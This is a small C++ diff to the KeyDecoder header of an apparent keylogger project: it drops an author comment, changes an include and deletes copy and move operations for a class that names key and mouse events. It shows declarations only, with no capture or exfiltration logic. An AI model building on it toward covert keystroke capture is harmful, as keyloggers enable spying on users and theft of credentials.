@@ -1,13 +1,11 @@
-//
-// Created by ofir on 7/24/25.
-//
 
 #ifndef KEYDECODER_HPP
 #define KEYDECODER_HPP
+
 #include <string>
 #include <unordered_map>
 
-#include "KeyListener.hpp"
+#include "Structs.hpp"
 
 namespace keylogger
 {
@@ -16,6 +14,11 @@ class KeyDecoder
 public:
     explicit KeyDecoder() = default;
     [[nodiscard]] std::string Decode(KeyEvent ev);
+
+    KeyDecoder(const KeyDecoder& decoder) = delete;
+    KeyDecoder(KeyDecoder&& decoder) = delete;
+    KeyDecoder& operator=(const KeyDecoder& decoder) = delete;
+    KeyDecoder& operator=(KeyDecoder&& decoder) = delete;
 private:
     static std::string GetMouseButtonName(int code);
     [[nodiscard]] std::string GetKeyName(int code, bool shifted) const;
